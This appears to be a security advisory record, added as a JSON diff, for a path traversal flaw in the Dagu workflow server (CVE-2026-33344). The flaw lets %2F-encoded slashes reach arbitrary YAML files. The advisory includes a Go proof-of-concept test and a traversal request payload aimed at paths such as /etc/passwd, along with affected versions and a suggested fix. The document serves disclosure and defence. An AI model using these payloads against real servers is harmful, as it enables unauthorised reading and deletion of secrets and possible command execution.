@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-ph8x-4jfv-v9v8",
+  "modified": "2026-03-27T22:17:37.291596Z",
+  "published": "2026-03-19T19:25:44Z",
+  "aliases": [
+    "CVE-2026-33344",
+    "GO-2026-4785"
+  ],
+  "summary": "Dagu has an incomplete fix for CVE-2026-27598: path traversal via %2F-encoded slashes in locateDAG",
+  "details": "The fix for CVE-2026-27598 (commit e2ed589, PR #1691) added `ValidateDAGName` to `CreateNewDAG` and rewrote `generateFilePath` to use `filepath.Base`. This patched the CREATE path. The remaining API endpoints - GET, DELETE, RENAME, EXECUTE - all pass the `{fileName}` URL path parameter to `locateDAG` without calling `ValidateDAGName`. `%2F`-encoded forward slashes in the `{fileName}` segment traverse outside the DAGs directory.\n\n### Vulnerable code\n\n`internal/persis/filedag/store.go`, lines 508-513:\n\n```go\nfunc (store *Storage) locateDAG(nameOrPath string) (string, error) {\n    if strings.Contains(nameOrPath, string(filepath.Separator)) {\n        foundPath, err := findDAGFile(nameOrPath)\n        if err == nil {\n            return foundPath, nil  // returns arbitrary resolved path\n        }\n    }\n    // ...safe searchPaths branch follows\n```\n\n`findDAGFile` resolves the path with `filepath.Abs` and checks only that the file exists with a YAML extension. No containment check against `baseDir`.\n\nChi v5 routes using `r.URL.RawPath` when set. The pattern `/dags/{fileName}/spec` captures `..%2F..%2Fetc%2Ftarget.yaml` as a single path segment. The oapi-codegen runtime calls `url.PathUnescape`, producing `../../etc/target.yaml`. This decoded string reaches `locateDAG` with the `/` separator intact.\n\nGo's `net/http.ServeMux` would normally redirect paths containing `..`, but dagu binds the chi mux directly to `\u0026http.Server{Handler: r}` (server.go:833-834), so no path cleaning fires.\n\n### Affected endpoints\n\nThe three confirmed impacts via `locateDAG`:\n\n| Endpoint | Impact |\n|----------|--------|\n| `GET /dags/{fileName}/spec` | Arbitrary `.yaml`/`.yml` file read (`os.ReadFile`) |\n| `DELETE /dags/{fileName}` | Arbitrary `.yaml`/`.yml` file delete (`os.Remove`) |\n| `POST /dags/{fileName}/start` | Load arbitrary YAML, execute as workflow |\n\nSame pattern affects all other `{fileName}` endpoints: `/dag-runs`, `/dag-runs/{id}`, `/rename`, `/start-sync`, `/enqueue`, and webhook handlers. `UpdateDAGSpec` is incidentally blocked by DAG name validation during YAML parsing - not a security check, just data integrity validation that happens to reject `/`.\n\n### PoC\n\n**Store-level** (dagu v2.0.2, Go 1.26, macOS; `locateDAG` unchanged through v2.3.0):\n\n```go\nfunc TestLocateDAGPathTraversal(t *testing.T) {\n    baseDir, _ := os.MkdirTemp(\"\", \"bd\")\n    defer os.RemoveAll(baseDir)\n    outsideDir, _ := os.MkdirTemp(\"\", \"od\")\n    defer os.RemoveAll(outsideDir)\n\n    store := filedag.New(baseDir, filedag.WithSkipExamples(true))\n    ctx := context.Background()\n    store.Create(ctx, \"legit\", []byte(\"name: legit\\nsteps:\\n  - name: s\\n    command: echo ok\\n\"))\n\n    target := filepath.Join(outsideDir, \"secret.yaml\")\n    os.WriteFile(target, []byte(\"password: hunter2\\ndb_host: prod-db.internal\\n\"), 0644)\n\n    rel, _ := filepath.Rel(baseDir, target)\n    spec, _ := store.GetSpec(ctx, rel)\n    fmt.Println(spec)\n}\n```\n\nOutput:\n\n```\nbaseDir:    /tmp/bd1816472583\ntargetFile: /tmp/od3906487343/secret.yaml\ntraversal:  ../od3906487343/secret.yaml\n\n=== GetSpec (arbitrary file read) ===\nSUCCESS: read file outside baseDir\nContent:\npassword: hunter2\ndb_host: prod-db.internal\n\n=== Delete (arbitrary file delete) ===\nSUCCESS: deleted /tmp/od3906487343/important.yaml\n```\n\n**HTTP-level** (chi v5.2.2):\n\n```go\nr := chi.NewRouter()\nr.Get(\"/dags/{fileName}/spec\", func(w http.ResponseWriter, r *http.Request) {\n    raw := chi.URLParam(r, \"fileName\")\n    decoded, _ := url.PathUnescape(raw)\n    fmt.Fprintf(w, \"raw=%s\\ndecoded=%s\\n\", raw, decoded)\n})\n\nreq := httptest.NewRequest(\"GET\", \"/dags/..%2F..%2Fetc%2Ftarget.yaml/spec\", nil)\nw := httptest.NewRecorder()\nr.ServeHTTP(w, req)\n```\n\nOutput:\n\n```\npath: /dags/..%2F..%2Fetc%2Fpasswd/spec\nstatus: 200\nraw=..%2F..%2Fetc%2Fpasswd\ndecoded=../../etc/passwd\n```\n\nChi captures `..%2F..%2Fetc%2Fpasswd` as one path segment via `RawPath`, oapi-codegen decodes `%2F` to `/`. Confirmed with chi v5.2.2.\n\n### Affected versions\n\n- v2.0.0 through v2.3.0 (current latest, checked 2026-03-18).\n- The `locateDAG` function with the `filepath.Separator` code path was introduced in commit 1557b14f (PR #1573) as part of the v2.0.0 rewrite.\n- The CVE-2026-27598 fix (e2ed589) also landed in v2.0.0 - it patched `CreateNewDAG` but didn't address the new `locateDAG` code path that was introduced in the same release.\n\n### Suggested fix\n\nAdd path containment to `locateDAG` rather than sprinkling `ValidateDAGName` across every handler. Reject names containing path separators for HTTP-facing callers. If the separator code path is needed for internal worker communication (PR #1573), split `locateDAG` into a validated public method (HTTP handlers) and an internal method (trusted callers only).\n\n### Impact\n\nAn authenticated user (or any user if `auth.mode=none`) can read or delete any `.yaml`/`.yml` file on the server filesystem that the process can access. K8s secrets stored as YAML, app configs, other DAG files.\n\nThe execute endpoints also traverse via `locateDAG`, loading the target YAML as a DAG definition. If the file contains valid DAG syntax with shell commands, those commands execute as the dagu process user. I haven't verified this end-to-end since it requires a target file with DAG-compatible structure, but the code path is the same `locateDAG` call confirmed above.\n\nAuth is enabled by default since PR #1688 (v2.0.0), but exploitable by any authenticated user regardless of role - the DAG read/delete paths don't enforce RBAC granularity. Pre-v2.0.0 deployments or those with `auth.mode=none` are exploitable without credentials.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/dagu-org/dagu",
+        "purl": "pkg:golang/github.com/dagu-org/dagu"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.30.4-0.20260221021317-e2ed589105d7"
+            },
+            {
+              "fixed": "1.30.4-0.20260319093346-7d07fda8f9de"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-ph8x-4jfv-v9v8/GHSA-ph8x-4jfv-v9v8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/dagu-org/dagu/security/advisories/GHSA-ph8x-4jfv-v9v8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33344"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/dagu-org/dagu/commit/7d07fda8f9de3ae73dfb081ccd0639f8059c56bb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/dagu-org/dagu"
+    }
+  ]
+}
